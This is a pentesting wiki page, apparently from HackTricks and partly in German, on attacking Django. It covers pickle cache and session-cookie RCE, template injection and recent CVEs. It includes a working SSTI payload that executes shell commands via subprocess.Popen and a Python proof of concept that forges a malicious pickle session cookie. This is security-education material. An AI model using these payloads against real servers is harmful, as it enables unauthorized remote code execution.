# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django's default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.

Django cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache stored in a Redis server or database are the most likely attack vectors (Redis injection and SQL injection), but an attacker may also be able to use file-based cache to turn an arbitrary write into RCE. Maintainers have marked this as a non-issue. It's important to note that the cache file folder, SQL table name, and Redis server details will vary based on implementation.

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. If user-supplied data is rendered as a *template string* (for example by calling `Template(user_input).render()` or when `|safe`/`format_html()` removes auto-escaping), an attacker may achieve full SSTI → RCE.

### Erkennung
1. Suche nach dynamischen Aufrufen von `Template()` / `Engine.from_string()` / `render_to_string()`, die *irgendwelche* unbereinigten Request-Daten enthalten.
2. Send a time-based or arithmetic payload:
```django
{{7*7}}
```
If the rendered output contains `49` the input is compiled by the template engine.

### Primitive zu RCE
Django blocks direct access to `__import__`, but the Python object graph is reachable:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
Finde den Index von `subprocess.Popen` (≈400–500, je nach Python-Build) und führe beliebige Befehle aus:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
Ein sichereres, universelles Gadget ist, so lange zu iterieren, bis `cls.__name__ == 'Popen'`.

Dasselbe Gadget funktioniert für **Debug Toolbar**- oder **Django-CMS**-Template-Rendering-Funktionen, die Benutzereingaben falsch verarbeiten.

---

### Siehe auch: ReportLab/xhtml2pdf PDF-Export RCE
Auf Django basierende Anwendungen integrieren häufig xhtml2pdf/ReportLab, um Views als PDF zu exportieren. Wenn von Benutzern kontrolliertes HTML in die PDF-Erzeugung gelangt, kann rl_safe_eval Ausdrücke innerhalb dreifacher Klammern `[[[ ... ]]]` auswerten, was Codeausführung ermöglicht (CVE-2023-33733). Details, payloads und Gegenmaßnahmen:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-gestützte Session-Cookie RCE
Wenn die Einstellung `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` aktiviert ist (oder ein benutzerdefinierter Serializer, der pickle deserialisiert), *entschlüsselt und unpickelt* Django das Session-Cookie **bevor** irgendein View-Code aufgerufen wird. Daher reicht das Besitzen eines gültigen Signing-Keys (standardmäßig der Projekt-`SECRET_KEY`) für sofortige Remote-Code-Ausführung.

### Exploit-Anforderungen
* Der Server verwendet `PickleSerializer`.
* Der Angreifer kennt / kann `settings.SECRET_KEY` erraten (leaks via GitHub, `.env`, Fehlerseiten, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Sende das resultierende Cookie, und die payload läuft mit den Rechten des WSGI-Workers.

**Gegenmaßnahmen**: Behalte den Standard-`JSONSerializer`, rotiere den `SECRET_KEY` und konfiguriere `SESSION_COOKIE_HTTPONLY`.

---

## Aktuelle (2023–2025) hochkritische Django-CVEs, die Pentester prüfen sollten
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (behoben am 4. Juni 2025). Ermöglicht Angreifern, Zeilenumbrüche/ANSI-Codes in Logdateien einzuschleusen und nachgelagerte Log-Analysen zu vergiften. Patch-Level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). Konstruiere JSON-Schlüssel, um aus dem Quoting auszubrechen und beliebiges SQL auszuführen. Behoben in 4.2.15 / 5.0.8.

Ermittle immer die genaue Framework-Version über die `X-Frame-Options` Fehlerseite oder den Hash von `/static/admin/css/base.css` und teste die oben genannten Punkte, wo anwendbar.

---

## Referenzen
* Django-Sicherheitsmeldung – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4. Juni 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11. August 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733, um RCE zu erlangen und in AD vorzudringen – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
